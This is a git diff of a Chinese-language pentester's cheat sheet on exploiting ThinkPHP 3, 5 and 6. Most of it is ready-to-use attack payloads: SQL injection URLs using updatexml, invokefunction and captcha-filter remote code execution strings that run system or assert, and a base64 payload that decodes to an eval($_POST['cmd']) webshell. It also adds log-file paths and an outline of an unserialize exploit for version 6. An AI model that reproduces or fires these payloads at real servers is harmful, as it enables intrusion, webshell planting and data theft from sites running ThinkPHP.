@@ -10,13 +10,50 @@ https://www.cnblogs.com/0xdd/p/11102426.html
 https://mp.weixin.qq.com/s?src=11&timestamp=1610677492&ver=2829&signature=qSAkzeeuM1ddHSQ-jdpYZlK*ZPNtriMl6TVSNeSL12Q-9vRtMoL954DUZOice6iV6-L3GJlY3bAtQAkcOciabH*oP6M-7c4*fdFLnUNt94w6OQi0EGTTNDhf1OGG*RfG&new=1
 
 https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
+
+https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
 ```
 
-
+---
 
 ## Thinkphp3
 
-Thinkphp3.2.3最新版update注入漏洞
+Tp3一般是底层出现漏洞，二次开发调用有漏洞的方法导致漏洞发生
+
+thinkphp3.1.3 二次开发 sql回传注入缓存 
+
+- 教程：https://www.zhihuifly.com/t/topic/309
+
+- /ThinkPHP/Library/Think/Model.class.php中find函数（本来就有漏洞）被调用，未经过处理直接调用产生漏洞
+
+```
+比如在/Application/Home/Controller/IndexController.class.php写入了
+public function test()
+    {
+       $id = i('id');
+       $res = M('user')->find($id);
+       //$res = M('user')->delete($id);
+       //$res = M('user')->select($id);
+    }
+```
+
+- payload
+
+	```
+	/index.php/home/index/test?id[field]=2,3,4,'%0aphpinfo();//'&id[cache][key]=1
+	```
+
+- 结果：产生c4ca4238a0b923820dcc509a6f75849b.php
+
+  ```
+  id[cache][key]=1 中的值 的MD5 -》c4ca4238a0b923820dcc509a6f75849b
+  /Application/Runtime/Temp/c4ca4238a0b923820dcc509a6f75849b.php
+  ```
+
+
+
+Thinkphp3.2.3 update注入漏洞
+
 
 ```
 /index.php/home/user?id[]=bind%27&money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
@@ -43,7 +80,7 @@ https://github.com/sukabuliet/ThinkphpRCE
 
 
 
-
+----
 
 ## Thinkphp5
 
@@ -74,6 +111,7 @@ get:（开兼容模式）
 /?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 /?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
+/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
 ---
 post:未开强制路由，或利用变量覆盖达到命令执行
 /?s=captcha
@@ -86,6 +124,10 @@ post:未开强制路由，或利用变量覆盖达到命令执行
 -
 /?s=captcha&test=phpinfo()  
  _method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1
+
+/?s=captcha&r=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=   ->一句话cmd
+/?s=captcha&r=cGhwaW5mbygpOw==               ->phpinfo
+  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS90bXAvc2Vzc19oYWhhaGF0ZXN0
 ```
 
 Thinkphp 5.1.x
@@ -107,7 +149,9 @@ post:未开强制路由，或利用变量覆盖达到命令执行
 Thinkphp常见日志路径：
 
 ```
-3.
+3: ['/Runtime/Logs/', '/App/Runtime/Logs/', '/Application/Runtime/Logs/Admin/', '/Application/Runtime/Logs/Home/', '/Application/Runtime/Logs/'],
+5: '/runtime/log/',
+
 /application/runtime/logs/home/21_02_01.log
 /application/runtime/logs/admin/21_02_01.log
 /runtime/log/21_02_01.log
@@ -142,3 +186,38 @@ cmd:PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
 2.没有权限写入时，可以试试蚁剑修改目录权限，再传，要传到能访问的目录中
 ```
 
+注入：
+
+```
+影响环境：
+5.0.13<=ThinkPHP<=5.0.15 、 5.1.0<=ThinkPHP<=5.1.5
+/index.php/index/index/?username[0]=inc&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1
+
+```
+
+---
+
+## Thinkphp6 rce
+
+### 反序列化
+
+- 背景
+  ```
+  php环境7以上
+  url路由：/控制器/操作/参数
+  ```
+- 参考
+  ```
+  https://www.cnblogs.com/-chenxs/p/12020777.html
+  https://xz.aliyun.com/t/9405#toc-3   # 含poc
+  ```
+- 漏洞位置
+  ```
+  假设控制器中有
+  unserialize($_GET['c'])
+  ```
+- 利用
+  ```
+  修改poc的phpinfo();使用php将poc跑出payload
+  /pulibc/?c= base64编码的序列化payload
+  ```
